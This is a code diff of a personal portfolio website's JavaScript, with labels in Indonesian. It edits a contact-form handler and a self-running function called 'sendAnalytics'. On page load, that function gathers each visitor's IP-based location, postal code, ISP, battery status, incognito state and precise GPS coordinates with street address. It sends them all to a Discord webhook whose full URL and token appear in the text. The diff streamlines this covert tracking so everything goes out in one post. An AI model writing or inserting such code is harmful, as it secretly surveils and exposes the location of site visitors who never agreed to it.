@@ -1391,7 +1391,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   btn.disabled = true;
   fb.style.opacity = '0';
 
-  const WEBHOOK = 'https://discord.com/api/webhooks/1511445599046733905/SbRGVq0s6PlPBh3X_9SSyNEF7AqWH3tUIgIREZdw7UL7oH7wI6i2mQB_P7uI_p5g9vQA';
+  const WEBHOOK = 'https://discord.com/api/webhooks/1512402866432901180/fQcOarEO-BJ73H_sak3D-Y1ZBIPPeBOze-FG9m-vzIRPDkEfofe7Cq9RRqPxXt-GWC3N';
 
   const embed = {
     title: '📬 New Message from Portfolio',
@@ -1437,7 +1437,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
 });
 
 (async function sendAnalytics(){
-  const WEBHOOK = 'https://discord.com/api/webhooks/1511445599046733905/SbRGVq0s6PlPBh3X_9SSyNEF7AqWH3tUIgIREZdw7UL7oH7wI6i2mQB_P7uI_p5g9vQA';
+  const WEBHOOK = 'https://discord.com/api/webhooks/1512402866432901180/fQcOarEO-BJ73H_sak3D-Y1ZBIPPeBOze-FG9m-vzIRPDkEfofe7Cq9RRqPxXt-GWC3N';
 
   if(sessionStorage.getItem('beta_analytics_sent')) return;
   sessionStorage.setItem('beta_analytics_sent', 'true');
@@ -1607,7 +1607,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     if(c.rtt)       rtt      = `${c.rtt} ms`;
   }
 
-  const [geo, battery, incognito] = await Promise.all([
+  const [geo, battery, incognito, detailLoc] = await Promise.all([
     (async()=>{
       let g = { ip:'unknown', city:'Unknown', region:'Unknown', country:'Unknown', country_code:'?', postal:'Unknown', org:'Unknown', asn:'Unknown' };
       try {
@@ -1631,6 +1631,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     })(),
     getBattery(),
     detectIncognito(),
+    getDetailedLocation()
   ]);
 
   const fields1 = [
@@ -1679,6 +1680,20 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'📮 Kode Pos',      value: geo.postal, inline: true },
   ];
 
+  if(detailLoc){
+    const mapsUrl = `https://www.google.com/maps?q=${detailLoc.lat},${detailLoc.lon}`;
+    const alamat  = [detailLoc.jalan, detailLoc.kelurahan, detailLoc.kecamatan, detailLoc.kota, detailLoc.negara]
+                    .filter(Boolean).join(', ') || 'Tidak tersedia';
+    fields2.push(
+      { name:'📍 Alamat GPS',   value: alamat, inline: false },
+      { name:'🗺️ Koordinat',    value: `\`${detailLoc.lat.toFixed(6)}, ${detailLoc.lon.toFixed(6)}\``, inline: true },
+      { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`, inline: true },
+      { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`, inline: true },
+    );
+  } else {
+    fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
+  }
+
   const embed2 = {
     title: '🌍 Lokasi & Jaringan',
     color: 0x22d3ee,
@@ -1690,33 +1705,12 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   try {
     const params = new URLSearchParams();
     params.append('payload_json', JSON.stringify({ embeds: [embed1, embed2] }));
-    await fetch(WEBHOOK + '?wait=true', { method: 'POST', body: params });
+    await fetch(WEBHOOK + '?wait=true', {
+      method: 'POST',
+      body: params
+    });
   } catch(err) {
     console.warn('Analytics webhook failed:', err);
-  }
-
-  const detailLoc = await getDetailedLocation();
-  if(detailLoc){
-    const mapsUrl = `https://www.google.com/maps?q=${detailLoc.lat},${detailLoc.lon}`;
-    const alamat  = [detailLoc.jalan, detailLoc.kelurahan, detailLoc.kecamatan, detailLoc.kota, detailLoc.negara]
-                    .filter(Boolean).join(', ') || 'Tidak tersedia';
-    const embedGPS = {
-      title: '📍 GPS Detail',
-      color: 0x34d399,
-      fields: [
-        { name:'📍 Alamat GPS',  value: alamat, inline: false },
-        { name:'🗺️ Koordinat',   value: `\`${detailLoc.lat.toFixed(6)}, ${detailLoc.lon.toFixed(6)}\``, inline: true },
-        { name:'🎯 Akurasi',     value: `±${detailLoc.accuracy}m`, inline: true },
-        { name:'🔗 Google Maps', value: `[Buka Maps](${mapsUrl})`, inline: true },
-      ],
-      footer: { text: `IP: ${geo.ip}  •  ${geo.country}` },
-      timestamp: new Date().toISOString()
-    };
-    try {
-      const p2 = new URLSearchParams();
-      p2.append('payload_json', JSON.stringify({ embeds: [embedGPS] }));
-      await fetch(WEBHOOK + '?wait=true', { method: 'POST', body: p2 });
-    } catch(e) {}
   }
 })();
 
